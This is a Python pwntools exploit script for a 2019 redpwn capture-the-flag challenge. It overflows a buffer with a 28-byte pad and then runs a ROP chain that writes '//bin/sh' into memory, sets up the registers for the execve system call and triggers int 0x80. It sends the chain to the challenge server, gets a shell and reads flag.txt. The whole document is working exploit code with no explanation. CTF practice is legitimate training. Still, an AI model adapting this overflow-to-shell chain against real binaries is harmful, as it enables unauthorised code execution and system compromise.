#!/usr/bin/env python
from pwn import *
import sys

p = lambda x : p32(x)

IMAGE_BASE_0 = 0x08048000 # 1cfd11f1d006f50931d3a220453f7aa84cce616651b3eeaa8364fec190e8ebc8
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''
rop += "A"*28
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += '//bi'
rop += rebase_0(0x00001b2b) # 0x08049b2b: pop edi; ret; 
rop += rebase_0(0x00092060)
rop += rebase_0(0x000574c1) # 0x0809f4c1: mov dword ptr [edi], ebx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += 'n/sh'
rop += rebase_0(0x00001b2b) # 0x08049b2b: pop edi; ret; 
rop += rebase_0(0x00092064)
rop += rebase_0(0x000574c1) # 0x0809f4c1: mov dword ptr [edi], ebx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x0000e5a0) # 0x080565a0: xor eax, eax; ret; 
rop += rebase_0(0x00026f2b) # 0x0806ef2b: pop edx; ret; 
rop += rebase_0(0x00092068)
rop += rebase_0(0x0000efe5) # 0x08056fe5: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00026f52) # 0x0806ef52: pop ecx; pop ebx; ret; 
rop += rebase_0(0x00092068)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += rebase_0(0x00092060)
rop += rebase_0(0x00026f2b) # 0x0806ef2b: pop edx; ret; 
rop += rebase_0(0x00092068)
rop += rebase_0(0x0000e5a0) # 0x080565a0: xor eax, eax; ret; 
rop += rebase_0(0x0004ad70) # 0x08092d70: add eax, 1; ret; 
rop += rebase_0(0x0004ad70) # 0x08092d70: add eax, 1; ret; 
rop += rebase_0(0x0004ad70) # 0x08092d70: add eax, 1; ret; 
rop += rebase_0(0x0004ad70) # 0x08092d70: add eax, 1; ret; 
rop += rebase_0(0x0004ad70) # 0x08092d70: add eax, 1; ret; 
rop += rebase_0(0x0004ad70) # 0x08092d70: add eax, 1; ret; 
rop += rebase_0(0x0004ad70) # 0x08092d70: add eax, 1; ret; 
rop += rebase_0(0x0004ad70) # 0x08092d70: add eax, 1; ret; 
rop += rebase_0(0x0004ad70) # 0x08092d70: add eax, 1; ret; 
rop += rebase_0(0x0004ad70) # 0x08092d70: add eax, 1; ret; 
rop += rebase_0(0x0004ad70) # 0x08092d70: add eax, 1; ret; 
rop += rebase_0(0x00027860) # 0x0806f860: int 0x80; ret;

r = remote("chall.2019.redpwn.net",4004)

r.recv(len("What is your name?\n"))
r.send(rop)
r.recv(200)
r.sendline("P")
r.read(1024)
r.sendline("/bin/cat flag.txt")
sys.stdout.write("[+][Flag] -> {}".format(r.read(1024)))
